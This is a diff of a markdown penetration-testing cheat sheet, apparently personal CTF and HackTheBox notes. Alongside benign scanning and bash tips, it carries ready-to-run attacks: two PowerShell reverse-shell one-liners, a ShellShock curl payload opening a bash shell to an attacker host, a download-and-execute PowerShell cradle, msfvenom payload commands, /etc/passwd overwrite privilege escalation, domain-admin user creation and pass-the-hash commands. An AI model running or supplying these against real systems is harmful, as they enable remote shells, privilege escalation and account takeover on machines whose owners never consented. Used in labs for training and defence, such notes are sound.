@@ -14,21 +14,19 @@ Always ensure you have **explicit** permission to access any computer system **b
 
 ## Markdown
 
-```
-{% raw %}
+```text
 {% hint style="warning" %} Text between these will show up in a Warning box. Looks nice! {% endhint %}
-{% endraw %}
 ```
 
 {% hint style="danger" %}
 Text between these will show up in a Warning box. Looks nice!
 
-_Can click on the icon to change it to something appropriate ( Changes style, I think. Gitbook only?)._
+_Can click on the icon to change it to something appropriate \( Changes style, I think. Gitbook only?\)._
 {% endhint %}
 
 ## -----
 
-[https://8gwifi.org/PemParserFunctions.jsp](https://8gwifi.org/PemParserFunctions.jsp) <--extract information from various digital certificates
+[https://8gwifi.org/PemParserFunctions.jsp](https://8gwifi.org/PemParserFunctions.jsp) &lt;--extract information from various digital certificates
 
 ## -----
 
@@ -36,11 +34,11 @@ _Can click on the icon to change it to something appropriate ( Changes style, I 
 
 ## SSH Keys
 
-`` ` extract public key from private key: ``openssl rsa -in privkey.pem -pubout -out key.pub\`
+``` extract public key from private key:``openssl rsa -in privkey.pem -pubout -out key.pub\`
 
 ## -----
 
-Windows enumeration: whoami /all net use z:  tasklist /v (verbose) netstat -an Get-WmiObject -class Win32\_UserAccount \[-filter "LocalAccount=True"]
+Windows enumeration: whoami /all net use z:  tasklist /v \(verbose\) netstat -an Get-WmiObject -class Win32\_UserAccount \[-filter "LocalAccount=True"\]
 
 ## -----
 
@@ -52,7 +50,7 @@ shortcut for all ports: `nmap -p-`
 
 ## -----
 
-Firefox Browser plugins:Tampermonkey (userscript manager); Cookie Manager+;
+Firefox Browser plugins:Tampermonkey \(userscript manager\); Cookie Manager+;
 
 ## HEX
 
@@ -62,7 +60,7 @@ reverse from hex: `xxd -r -p > <filename>`
 
 ## msfvenom
 
-custom exploit making:\[Ippsec:HacktheBox - Granny & Grandpa]
+custom exploit making:\[Ippsec:HacktheBox - Granny & Grandpa\]
 
 ```bash
 msfvenom -p <payload> LHOST=<lhost> etc... -f <filetype [use --help-formats first]>
@@ -98,7 +96,7 @@ recursively download all files in hosted folder: `wget -r <ip:port>`
 
 primer: [Ippsec:HacktheBox - Sneaky](https://www.youtube.com/watch?v=1UGxjqTnuyo)
 
-```
+```text
 fe80::/10 - febf:ffff:ffff:ffff:ffff:ffff:ffff:ffff Unique Link Local 169.254.x.x APIPA 
 (built from MAC address on Linux, 7th bit flips, adds ff:fe in the center)
 
@@ -123,11 +121,11 @@ Cisco Smart Install Client Service Available -Then, we can pull the configs with
 
 ## pass the hash
 
-responder.py - or - write .lnk files to writeable shares that point back to attacker - capture hashes and relay attacks enable smb signing and limit llmnr (group policy) respounder - detect responder - responder guard
+responder.py - or - write .lnk files to writeable shares that point back to attacker - capture hashes and relay attacks enable smb signing and limit llmnr \(group policy\) respounder - detect responder - responder guard
 
 `crackmapexec smb ip -u <name> -H <hash> --lsa` - pass the hash; drsuapi - search in wireshark to detect - win long id 4624 user\_reported\_sid: S-1-0-0 logon\_process\_name:ntlmssp
 
-Defense:[https://github.com/Neo23x0/sigma/blob/master/rules/windows/builtin/win\_pass\_the\_hash.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/builtin/win\_pass\_the\_hash.yml); In our lab environment, we could consistently catch the pass-the-hash attacks by monitoring event\_id : 4624, with logon types of ntlmssp, and the security SID at S-1-0-0 (NULL / NOBODY). You too can instrument this attack!
+Defense:[https://github.com/Neo23x0/sigma/blob/master/rules/windows/builtin/win\_pass\_the\_hash.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/builtin/win_pass_the_hash.yml); In our lab environment, we could consistently catch the pass-the-hash attacks by monitoring event\_id : 4624, with logon types of ntlmssp, and the security SID at S-1-0-0 \(NULL / NOBODY\). You too can instrument this attack!
 
 ## -----
 
@@ -139,7 +137,7 @@ Plumhound -
 
 ## -----
 
-Bad blood - create domain for your (defense tool, or lab setup) fills AD with objects, don't use in production! (cant create sessions)
+Bad blood - create domain for your \(defense tool, or lab setup\) fills AD with objects, don't use in production! \(cant create sessions\)
 
 ## Winpeas
 
@@ -147,25 +145,25 @@ Bad blood - create domain for your (defense tool, or lab setup) fills AD with ob
 
 [https://ss64.com/nt/icacls.html](https://ss64.com/nt/icacls.html) Interesting permissions
 
-D - Delete access F - Full access (Edit\_Permissions+Create+Delete+Read+Write) N - No access M - Modify access (Create+Delete+Read+Write) RX - Read and eXecute access R - Read-only access W - Write-only access
+D - Delete access F - Full access \(Edit\_Permissions+Create+Delete+Read+Write\) N - No access M - Modify access \(Create+Delete+Read+Write\) RX - Read and eXecute access R - Read-only access W - Write-only access
 
-winpeas.exe cmd searchall searchfast #cmd commands, search all filenames and avoid sleeping (noisy - CTFs)
+winpeas.exe cmd searchall searchfast \#cmd commands, search all filenames and avoid sleeping \(noisy - CTFs\)
 
-winpeas.exe #Will execute all checks except the ones that use a CMD
+winpeas.exe \#Will execute all checks except the ones that use a CMD
 
-winpeas.exe cmd #All checks
+winpeas.exe cmd \#All checks
 
-winpeas.exe systeminfo userinfo #Only systeminfo and userinfo checks executed
+winpeas.exe systeminfo userinfo \#Only systeminfo and userinfo checks executed
 
-winpeas.exe notcolor #Do not color the output
+winpeas.exe notcolor \#Do not color the output
 
-winpeas.exe cmd wait #cmd commands and wait between tests
+winpeas.exe cmd wait \#cmd commands and wait between tests
 
-In Linux the ouput will be colored using ANSI colors. If you are executing winpeas.exe from a Windows console, you need to set a registry value to see the colors (and open a new CMD): `REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1`
+In Linux the ouput will be colored using ANSI colors. If you are executing winpeas.exe from a Windows console, you need to set a registry value to see the colors \(and open a new CMD\): `REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1`
 
 ### -----
 
-[https://github.com/wpscanteam/wpscan/issues/190#issuecomment-18087644](https://github.com/wpscanteam/wpscan/issues/190#issuecomment-18087644) `iconv -f ISO-8859-1 -t UTF-8 /pentest/passwords/wordlists/rockyou.txt > rockyou_utf8.txt`
+[https://github.com/wpscanteam/wpscan/issues/190\#issuecomment-18087644](https://github.com/wpscanteam/wpscan/issues/190#issuecomment-18087644) `iconv -f ISO-8859-1 -t UTF-8 /pentest/passwords/wordlists/rockyou.txt > rockyou_utf8.txt`
 
 Some programs have issues with rockyou.txt because the file is in the wrong encoding by default.  USe the above to convert it to utf8 so it works with these programs.
 
@@ -179,7 +177,7 @@ Some programs have issues with rockyou.txt because the file is in the wrong enco
 
 ### -----
 
-compress files using windows, sets "Compressed" attribute (cmd.exe) `compact /C /S c:\MyDirectory`
+compress files using windows, sets "Compressed" attribute \(cmd.exe\) `compact /C /S c:\MyDirectory`
 
 ### -----
 
@@ -187,31 +185,31 @@ compress files using windows, sets "Compressed" attribute (cmd.exe) `compact /C 
 
 ### -----
 
-[https://base64.guru/converter/decode/file](https://base64.guru/converter/decode/file) recover files sent in base64 (very useful for recovering files sent in emails)
+[https://base64.guru/converter/decode/file](https://base64.guru/converter/decode/file) recover files sent in base64 \(very useful for recovering files sent in emails\)
 
 ### -----
 
 wfuzz -c -z range,1-65535 --hl=2 [http://10.10.10.55:60000/url.php?path=localhost:FUZZ](http://10.10.10.55:60000/url.php?path=localhost:FUZZ)
 
-burp intruder alternative for brute-forcing ports (or any number range)
+burp intruder alternative for brute-forcing ports \(or any number range\)
 
 ### -----
 
-##
+## 
 
 ### -----
 
 ## Faster filtering with the silver searcher
 
-[https://github.com/ggreer/the\_silver\_searcher](https://github.com/ggreer/the\_silver\_searcher)
+[https://github.com/ggreer/the\_silver\_searcher](https://github.com/ggreer/the_silver_searcher)
 
 For faster searching, use all the above grep regular expressions with the command `ag`.
 
 ### -----
 
-take the name of each file in a directory and try to connect to a site with that filename. (searching for web shells in Traceback- HTB)
+take the name of each file in a directory and try to connect to a site with that filename. \(searching for web shells in Traceback- HTB\)
 
-```
+```text
 for file in $(cat /home/zweilos/htb/traceback/webshells); do echo $file && curl -I http://10.10.10.181/$file; done
 ```
 
@@ -221,14 +219,14 @@ for file in $(cat /home/zweilos/htb/traceback/webshells); do echo $file && curl 
 
 ### Useful x86 Msfvenom Encoders
 
-```
+```text
 x86/shikata_ga_nai
 x86/fnstenv_mov
 ```
 
 ### TMUX Hijacking
 
-```
+```text
 tmux -S *session path* 
 Example: tmux -S /.devs/dev_sess
 ```
@@ -237,31 +235,31 @@ Example: tmux -S /.devs/dev_sess
 
 Find:
 
-```
+```text
 dir /R
 ```
 
 Read:
 
-```
+```text
 more < hm.txt:root.txt:$DATA
 ```
 
-### DirtyCOW Exploit (Linux Kernel version from 2.6.22 to 3.9)
+### DirtyCOW Exploit \(Linux Kernel version from 2.6.22 to 3.9\)
 
 [https://github.com/FireFart/dirtycow/blob/master/dirty.c](https://github.com/FireFart/dirtycow/blob/master/dirty.c)
 
-### Oracle Enumeration TNS Listener (port 1521)
+### Oracle Enumeration TNS Listener \(port 1521\)
 
 [https://github.com/quentinhardy/odat](https://github.com/quentinhardy/odat)
 
-```
+```text
 Also check HackTheBox Silo writeup for more references
 ```
 
 ### Buffer Overflow Bad Chars
 
-```
+```text
 "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
 "\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
 "\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
@@ -274,13 +272,13 @@ Also check HackTheBox Silo writeup for more references
 
 ### JS Meterpreter Payload
 
-```
+```text
 msfvenom -p <payload > LHOST=<ip> LPORT=<port> -f js_le -e generic/none
 ```
 
 ### Compile on Linux for Windows x86
 
-```
+```text
 i686-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32
 ```
 
@@ -288,39 +286,39 @@ i686-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32
 
 [https://www.tarlogic.com/en/blog/red-team-tales-0x01/](https://www.tarlogic.com/en/blog/red-team-tales-0x01/)
 
-### Windows Kernel Vulnerabilities Finder - Sherlock (PowerShell)
+### Windows Kernel Vulnerabilities Finder - Sherlock \(PowerShell\)
 
-```
+```text
 https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1
 ```
 
-### PowerShell one-liners (incl. file transfers)
+### PowerShell one-liners \(incl. file transfers\)
 
-```
+```text
 https://www.puckiestyle.nl/
 ```
 
 ### Much Better PowerShell Reverse Shell One-Liner
 
-```
+```text
 powershell -NoP -NonI -W Hidden -Exec Bypass "& {$ps=$false;$hostip='IP';$port=PORT;$client = New-Object System.Net.Sockets.TCPClient($hostip,$port);$stream = $client.GetStream();[byte[]]$bytes = 0..50000|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$cmd=(get-childitem Env:ComSpec).value;$inArray=$data.split();$item=$inArray[0];if(($item -eq '$ps') -and ($ps -eq $false)){$ps=$true}if($item -like '?:'){$item='d:'}$myArray=@('cd','exit','d:','pwd','ls','ps','rm','cp','mv','cat');$do=$false;foreach ($i in $myArray){if($item -eq $i){$do=$true}}if($do -or $ps){$sendback=( iex $data 2>&1 |Out-String)}else{$data2='/c '+$data;$sendback = ( &$cmd $data2 2>&1 | Out-String)};if($ps){$prompt='PS ' + (pwd).Path}else{$prompt=(pwd).Path}$sendback2 = $data + $sendback + $prompt + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()}"
 ```
 
 ### Post-Exploitation Enumerate all users of Domain
 
-```
+```text
 net user /Domain
 ```
 
 ### Windows XP SP0/SP1 Privilege Escalation:
 
-```
+```text
 https://sohvaxus.github.io/content/winxp-sp1-privesc.html
 ```
 
 ### SUID Flag on /usr/bin/cp command Privilege Escalation
 
-```
+```text
 1. echo "bob:\$1\$-itnite\$VRvGqpGVibx/r9NPdLLTF1:0:0:root:/root:/bin/bash" >> /tmp/passwd
 2. /usr/bin/cp /tmp/passwd /etc/passwd
 3. su - bob (Password: bob)
@@ -328,7 +326,7 @@ https://sohvaxus.github.io/content/winxp-sp1-privesc.html
 
 ### Writable /etc/passwd Privilege Escalation
 
-```
+```text
 echo root::0:0:root:/root:/bin/bash > /etc/passwd
 
 su
@@ -336,17 +334,17 @@ su
 
 ### Bypass robots.txt "You are not a search engine. Permission denied."
 
-```
+```text
 Set User-Agent to "User-Agent: Googlebot/2.1 (+http://www.googlebot.com/bot.html)"
 ```
 
-### ShellShock PHP < 5.6.2
+### ShellShock PHP &lt; 5.6.2
 
-```
+```text
 curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/ATTACKER IP/PORT 0>&1'  http://VICTOM/cgi-bin/admin.cgi
 ```
 
-### Privilege Escalation through SeImpersonatePrivilege permission (JuicyPotato)
+### Privilege Escalation through SeImpersonatePrivilege permission \(JuicyPotato\)
 
 [https://github.com/ohpe/juicy-potato/releases](https://github.com/ohpe/juicy-potato/releases) [https://www.absolomb.com/2018-05-04-HackTheBox-Tally/](https://www.absolomb.com/2018-05-04-HackTheBox-Tally/)
 
@@ -354,13 +352,13 @@ curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/ATTACKER IP/PORT 0>&1' 
 
 [https://www.hackingarticles.in/penetration-testing-on-memcached-server/](https://www.hackingarticles.in/penetration-testing-on-memcached-server/)
 
-### Tunneling Post-Exploitation (PortForwarding) through Chisel
+### Tunneling Post-Exploitation \(PortForwarding\) through Chisel
 
 [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)
 
 ### Tunelling on Windows
 
-```
+```text
 Using plink.exe within PuTTY project folder
 ```
 
@@ -368,13 +366,13 @@ Using plink.exe within PuTTY project folder
 
 invalid query?
 
-```
+```text
 wmic service where caption="SERVICE" get startmode
 ```
 
 ### Windows check permissions over a file/executable with 'icacls'
 
-```
+```text
 icacls "C\full_path\file.exe"
 ```
 
@@ -382,11 +380,11 @@ Permissions: F - full access M - modify access RX - read & execute access R - re
 
 ### Powershell Running Services
 
-```
+```text
 Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}
 ```
 
-### Client-Side .hta (HTML-based Internet Explorer only) Code Execution
+### Client-Side .hta \(HTML-based Internet Explorer only\) Code Execution
 
 ```markup
 <html>
@@ -407,7 +405,7 @@ Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object
 
 [https://securityheaders.com/](https://securityheaders.com/)
 
-### PowerShell to retrieve Active Directory objects (including deleted)
+### PowerShell to retrieve Active Directory objects \(including deleted\)
 
 `Get-ADObject`
 
@@ -427,15 +425,15 @@ mysqldump
 
 [https://github.com/TarlogicSecurity/kerbrute](https://github.com/TarlogicSecurity/kerbrute)
 
-### TeamViewer Privilege Escalation -> CVE-2019-189888
+### TeamViewer Privilege Escalation -&gt; CVE-2019-189888
 
-```
+```text
 meterpreter &gt; run post/windows/gather/credentials/teamviewer\_passwords
 ```
 
 ### PowerShell Reverse Shell
 
-```
+```text
 $client = New-Object System.Net.Sockets.TCPClient\('192.168.0.0',4444\);$stream = $client.GetStream\(\);\[byte\[\]\]$bytes = 0..65535\|%{0};while\(\($i = $stream.Read\($bytes, 0, $bytes.Length\)\) -ne 0\){;$data = \(New-Object -TypeName System.Text.ASCIIEncoding\).GetString\($bytes,0, $i\);$sendback = \(iex $data 2&gt;&1 \| Out-String \);$sendback2 = $sendback + 'PS ' + \(pwd\).Path + '&gt; ';$sendbyte = \(\[text.encoding\]::ASCII\).GetBytes\($sendback2\);$stream.Write\($sendbyte,0,$sendbyte.Length\);$stream.Flush\(\)};$client.Close\(\)
 
 $sm=\(New-Object Net.Sockets.TCPClient\('192.168.0.0',4444\)\).GetStream\(\);\[byte\[\]\]$bt=0..65535\|%{0};while\(\($i=$sm.Read\($bt,0,$bt.Length\)\) -ne 0\){;$d=\(New-Object Text.ASCIIEncoding\).GetString\($bt,0,$i\);$st=\(\[text.encoding\]::ASCII\).GetBytes\(\(iex $d 2&gt;&1\)\);$sm.Write\($st,0,$st.Length\)}
@@ -443,19 +441,19 @@ $sm=\(New-Object Net.Sockets.TCPClient\('192.168.0.0',4444\)\).GetStream\(\);\[b
 
 Pull the shell:
 
-```
+```text
 powershell.exe -c "IEX \(New-Object Net.WebClient\).DownloadString\('SHELL URL'\)"
 ```
 
 ### Wget Alternative for Windows in PowerShell
 
-```
+```text
 $client = new-object System.Net.WebClient $client.DownloadFile\("URL","Local Download Path"\)
 ```
 
-### CVE-2019-10-15 Sudo < 1.2.28 Privilege Escalation
+### CVE-2019-10-15 Sudo &lt; 1.2.28 Privilege Escalation
 
-```
+```text
 sudo -u#-1 /bin/bash
 ```
 
@@ -469,10 +467,10 @@ sudo -u#-1 /bin/bash
 
 ### SMB Recursively List Files
 
-`recurse on` \
-&#x20;`ls`
+`recurse on`   
+ `ls`
 
-### Telnet > Netcat
+### Telnet &gt; Netcat
 
 When connecting to a service, where possible, choose TELNET over Netcat
 
@@ -537,9 +535,9 @@ ldapsearch -H ldap://host:port -x -s base '' "(objectClass=*)" "*" +
 
 ### Decode Rubber Ducky USB .bin payloads
 
-[https://ducktoolkit.com/decode#](https://ducktoolkit.com/decode)
+[https://ducktoolkit.com/decode\#](https://ducktoolkit.com/decode#)
 
-### Crack Android lockscreen from system files (gesture.key)
+### Crack Android lockscreen from system files \(gesture.key\)
 
 [https://github.com/KieronCraggs/GestureCrack](https://github.com/KieronCraggs/GestureCrack)
 
@@ -568,7 +566,7 @@ ldapsearch -H ldap://host:port -x -s base '' "(objectClass=*)" "*" +
 
 [https://asecuritysite.com/encryption/ctf?mybutton=](https://asecuritysite.com/encryption/ctf?mybutton=)
 
-### Shift in Python (crypto)
+### Shift in Python \(crypto\)
 
 ```python
 with open('FILENAME') as f:
@@ -579,7 +577,7 @@ with open('FILENAME') as f:
 
 ### Predict encoding/crypto type
 
-[https://gchq.github.io/CyberChef/#recipe=Magic(3,false,false](https://gchq.github.io/CyberChef/#recipe=Magic\(3,false,false),'')
+[https://gchq.github.io/CyberChef/\#recipe=Magic\(3,false,false](https://gchq.github.io/CyberChef/#recipe=Magic%283,false,false),''\)
 
 ### Get data, process and respond over a socket
 
@@ -622,13 +620,13 @@ chaosreader
 
 _HEADER_
 
-```
+```text
 50 4B 03 04 14
 ```
 
 _FOOTER_
 
-```
+```text
 50 4B 05 06 00
 ```
 
@@ -636,7 +634,7 @@ _FOOTER_
 
 _Sign with public file from server_
 
-```
+```text
 kid: public/css/file.css
 
 wget file.css from target
@@ -646,7 +644,7 @@ manipulate token using jwt_tool and sign it with file.css
 
 _SQL Injection_
 
-```
+```text
 kid: test' UNION SELECT 'key';--
 
 manipulate token using jwt_tool and sign it using the secret -> 'key'
@@ -673,18 +671,15 @@ _INSIDE DTD FILE_
 
 [https://github.com/corneacristian/Notes](https://github.com/corneacristian/Notes)
 
-Enumerate Users via Finger
-
+## Enumerate Users via Finger
 
 `finger $user@$IP`
 
-Show nfs shares available
-
+## Show nfs shares available
 
 `showmount -e $IP`
 
-Use nfspysh to mount share and create .ssh directory
-
+## Use nfspysh to mount share and create .ssh directory
 
 nfspysh -o server=192.168.0.20:/home/user
 
@@ -692,21 +687,19 @@ mkdir .ssh
 
 cd .ssh
 
-Transfer attacker public key to host&#x20;with FTP
---------------
+## Transfer attacker public key to host with FTP
 
 put /tmp/authorized\_keys
 
 exit
 
-Login to SSH server with no password
-
+## Login to SSH server with no password
 
 SSH\_AUTH\_SOCK=0 ssh user@192.168.0.20
 
 ## Bash Basics
 
-\[+] nano Shortcuts
+\[+\] nano Shortcuts
 
 ```markup
 ctrl v			Next page.
@@ -716,7 +709,7 @@ ctrl k			Cut that line of test.
 ctrl x     	Exit editor.
 ```
 
-\[+] Create a text file:
+\[+\] Create a text file:
 
 ```markup
 touch file		Creates an empty file.
@@ -724,7 +717,7 @@ ifconfig > tmp	pipe the output of a command
 nano file
 ```
 
-\[+] Create a file and append text to it:
+\[+\] Create a file and append text to it:
 
 ```markup
 ifconfig > tmp     
@@ -732,7 +725,7 @@ echo >> tmp
 ping google.com -c3 >> tmp
 ```
 
-\[+] How to view a file:
+\[+\] How to view a file:
 
 ```markup
 cat file		    Show entire contents of file.
@@ -744,13 +737,13 @@ tail -15 file	  Show the last 15 lines.
 tail -f file	  Useful when viewing the output of a log file.
 ```
 
-\[+] Word Count
+\[+\] Word Count
 
 ```markup
 wc -l tmp2		Count the number of lines in a file
 ```
 
-\[+] sort
+\[+\] sort
 
 ```markup
 sort -u file                                        Sort by unique		
@@ -758,20 +751,20 @@ sort -t . -k 1,1n -k 2,2n -k 3,3n -k 4,4n            Sort IP addresses correctly
 cat tmp2 | cut -d '(' -f2 | cut -d ')' -f1 | sort -u		Isolate the IP address
 ```
 
-\[+] awk
+\[+\] awk
 
 ```markup
 awk '{print $1}' file 		Show the 1st column.
 awk '{print $1,$5}' file 	Show the 1st and 5th columns.
 ```
 
-\[+] egrep -v
+\[+\] egrep -v
 
 ```markup
 Remove multiple strings	egrep -v '(red|white|blue)' file
 ```
 
-\[+] sed
+\[+\] sed
 
 ```markup
 sed 's/FOO/BAR/g' file 		Replace FOO with BAR.
@@ -781,23 +774,23 @@ sed '/^FOO/d' file 			Remove lines that start with FOO.
 
 
 
-\[+] colors
+\[+\] colors
 
 ```markup
 31=red 32=green 33=yellow 34=blue 35=magenta 36=cyan 
 echo -e "\e[1;34mThis is a blue text.\e[0m"
 ```
 
-\[+] Make a file executable.
+\[+\] Make a file executable.
 
 ```markup
 chmod +x file
 chmod 755 file
 ```
 
-\[+] Reminders
+\[+\] Reminders
 
-```
+```text
 LOG EVERYTHING!
 
 Metasploit - spool /home/<username>/console.log
@@ -824,7 +817,7 @@ Subnetting easy mode
 ipcalc 192.168.0.1 255.255.255.0
 ```
 
-```
+```text
 
 [+] External Infrastructure Testing - Information Gathering
 
@@ -1059,7 +1052,7 @@ Endpoint_mapper metasploit
 
 ## Windows Enumeration
 
-```
+```text
 ipconfig /all
 systeminfo
 net localgroup administrators
@@ -1075,7 +1068,7 @@ meterpreter > post/windows/gather/credentials/gpp
 
 ## Add Windows User
 
-```
+```text
 Add Windows User
 net user username password /ADD
 net localgroup Administrators username /ADD
@@ -1084,9 +1077,9 @@ net user username password /ADD /DOMAIN
 net group "Domain Admins" username /ADD /DOMAIN
 ```
 
-## \[+] Pivoting - Lateral Movement
+## \[+\] Pivoting - Lateral Movement
 
-```
+```text
 SSH Tunneling:
 Remote forward port 222
 ssh -R 127.0.0.1:4444:10.1.1.251:222 -p 443 root@192.168.10.118
@@ -1117,7 +1110,7 @@ setg socks4:127.0.0.1:1080
 
 ## Finger - Enumerate Users
 
-```
+```text
 finger @192.168.0.1
 finger -l -p user@ip-address
 Metasploit - auxiliary/scanner/finger/finger_users
@@ -1125,7 +1118,7 @@ Metasploit - auxiliary/scanner/finger/finger_users
 
 ## SNMP
 
-```
+```text
 onesixtyone -c /usr/share/doc/onesixtyone/dict.txt
 Metasploit Module snmp_enum
 snmpcheck -t snmpservice
@@ -1134,7 +1127,7 @@ snmpcheck -t snmpservice
 
 ## NFS
 
-```
+```text
 showmount -e 192.168.0.10
 mount 192.168.0.10:/secret /mnt/share/
 Metasploit - auxiliary/scanner/nfs/nfsmount
@@ -1143,7 +1136,7 @@ rpcinfo -p 192.168.0.10
 
 ## LDAP
 
-```
+```text
 Tools:
 ldapsearch
 LDAPExplorertool2
@@ -1161,7 +1154,7 @@ ldapsearch -h 192.168.0.60 -p 389 -x -D "CN=Administrator, CN=User, DC=<domain>,
 
 ## SMTP
 
-```
+```text
 ncat -C mail.host.com 25
 
 EHLO hostname
@@ -1180,7 +1173,7 @@ QUIT
 
 ## Useful Commands
 
-```
+```text
 [+] Remove text using sed
 cat SSL_Hosts.txt | sed -r 's/\ttcp\t/:/g'
 
@@ -1210,21 +1203,21 @@ nmap -PN -d -p445 --script=smb-check-vulns --script-args=safe=1 IP-RANGES
 
 
 
-###
+### 
 
 ### Port Scanning
 
 Port scanning is the process of checking for open TCP or UDP ports on a remote machine.
 
-> \--Please note that port scanning is illegal in many countries and should not be performed outside the labs.--
+> --Please note that port scanning is illegal in many countries and should not be performed outside the labs.--
 
 #### Connect Scanning
 
 * The simplest TCP port scanning technique, usually called CONNECT scanning, relies on the three-way TCP handshake mechanism.
-* Connect port scanning involves attempting to complete a three-way handshake with the target host on the specified port(s).
+* Connect port scanning involves attempting to complete a three-way handshake with the target host on the specified port\(s\).
 * If the handshake is completed, this indicates that the port is open.
 
-```
+```text
 # TCP Netcat port scan on ports 3388-3390
 > nc -nvv -w 1 -z 10.0.0.19 3388-3390
 # -n :: numeric only ip adressess no DNS
@@ -1242,7 +1235,7 @@ Port scanning is the process of checking for open TCP or UDP ports on a remote m
 
 #### UDP Scanning
 
-```
+```text
 > nc -nv -u -z -w 1 10.0-0.19 160-162
 # -u :: UDP mode
 ```
@@ -1257,7 +1250,7 @@ Port scanning is the process of checking for open TCP or UDP ports on a remote m
 
 * A default nmap TCP scan will scan the 1000 most popular ports on a given machine.
 
-```
+```text
 # We’ll scan one of my local machines while monitoring the amount
 # of traffic sent to the specific host using iptables.
 > iptables -I INPUT 1 -s 10.0.0.19 -j ACCEPT
@@ -1284,7 +1277,7 @@ Port scanning is the process of checking for open TCP or UDP ports on a remote m
 * A similar local port scan explicitly probing all 65535 ports would generate about 4.5 MB of traffic, a significantly higher amount.
 * However, this full port scan has discovered two new ports that were not found by the default TCP scan: ports 180 and 25017.
 
-\--Full nmap scan of a class C network (254 hosts) would result in sending over 1000 MB of traffic to the network.--
+--Full nmap scan of a class C network \(254 hosts\) would result in sending over 1000 MB of traffic to the network.--
 
 **So, if we are in a position where we can’t run a full port scan on the network, what can we do?**
 
@@ -1293,7 +1286,7 @@ Port scanning is the process of checking for open TCP or UDP ports on a remote m
 * To deal with large volumes of hosts, or to otherwise try to conserve network traffic, we can attempt to probe these machines using Network Sweeping techniques.
 * Machines that filter or block ICMP requests may seem down to a ping sweep, so it is not a definitive way to identify which machines are really up or down.
 
-```
+```text
 > nmap -sP 192.168.1.0/24 ## Deprecated in modern versions Use -sn instead
 Show ips of connected devices
 
@@ -1316,26 +1309,26 @@ Show ips of connected devices
 
 #### OS Fingerprinting
 
-```
+```text
 # OS fingerprinting (-O parameter).
 > nmap -O 10.0.0.19
 ```
 
 #### Banner Grabbing/Service Enumeration
 
-Nmap can also help identify services on specific ports, by banner grabbing, and running several enumeration scripts (-sV and -A parameters).
+Nmap can also help identify services on specific ports, by banner grabbing, and running several enumeration scripts \(-sV and -A parameters\).
 
-```
+```text
 > nmap -sV -sT 10.0.0.19
 # -sV :: probe open ports to determine service / version info
 ```
 
-#### Nmap Scripting Engine (NSE)
+#### Nmap Scripting Engine \(NSE\)
 
 * The scripts include a broad range of utilities, from DNS enumeration scripts, brute force attack scripts, and even vulnerability identification scripts.
 * All NSE scripts can be found in the /usr/share/nmap/scripts directory
 
-```
+```text
 > nmap 10.0.0.19 --script smb-os-discovery.nse
 # Another useful script is the DNS zone transfer NSE script
 > nmap --script=dns-zone-transfer -p 53 ns2.megacorpone.com
@@ -1343,7 +1336,7 @@ Nmap can also help identify services on specific ports, by banner grabbing, and 
 
 #### SMB Enumeration
 
-```
+```text
 SMB1   – Windows 2000, XP and Windows 2003.
 SMB2   – Windows Vista SP1 and Windows 2008
 SMB2.1 – Windows 7 and Windows 2008 R2
@@ -1352,16 +1345,17 @@ SMB3   – Windows 8 and Windows 2012.
 
 **Scanning for the NetBIOS Service**
 
-*   The SMB NetBIOS32 service listens on TCP ports 139 and 445, as well as several UDP ports.
+* The SMB NetBIOS32 service listens on TCP ports 139 and 445, as well as several UDP ports.
 
-    ```
-    > nmap -v -p 139,445 -oG smb.txt 192.168.11.200-254
-    ```
-*   There are other, more specialized, tools for specifically identifying NetBIOS information
+  ```text
+  > nmap -v -p 139,445 -oG smb.txt 192.168.11.200-254
+  ```
 
-    ```
-    > nbtscan -r 192.168.11.0/24
-    ```
+* There are other, more specialized, tools for specifically identifying NetBIOS information
+
+  ```text
+  > nbtscan -r 192.168.11.0/24
+  ```
 
 **Null Session Enumeration**
 
@@ -1369,13 +1363,13 @@ SMB3   – Windows 8 and Windows 2012.
 * A null session also allows unauthenticated hackers to obtain large amounts of information about the machine, such as password policies, usernames, group names, machine names, user and host SIDs.
 * This Microsoft feature existed in SMB1 by default and was later restricted in subsequent versions of SMB.
 
-```
+```text
 > enum4linux -a 192.168.11.227
 ```
 
 **Nmap SMB NSE Scripts**
 
-```
+```text
 # These scripts can be found in the /usr/share/nmap/scripts directory
 > ls -l /usr/share/nmap/scripts/smb-
 # We can see that several interesting Nmap SMB NSE scripts exist,, such as OS discovery
@@ -1394,14 +1388,14 @@ SMB3   – Windows 8 and Windows 2012.
 * while EXPN asks the server for the membership of a mailing list.
 * These can often be abused to verify existing users on a mail server, which can later aid the attacker.
 
-```
+```text
 # This procedure can be used to help guess valid usernames.
 > nc -nv 192.168.11.215 25
 ```
 
 * Examine the following simple Python script that opens a TCP socket, connects to the SMTP server, and issues a VRFY command for a given username.
 
-```
+```text
 # !/usr/bin/python
 import socket
 import sys
@@ -1429,11 +1423,67 @@ print result
 s.close()
 ```
 
+## SNMP Enumeration \(Simple Network Management Protocol\)
+
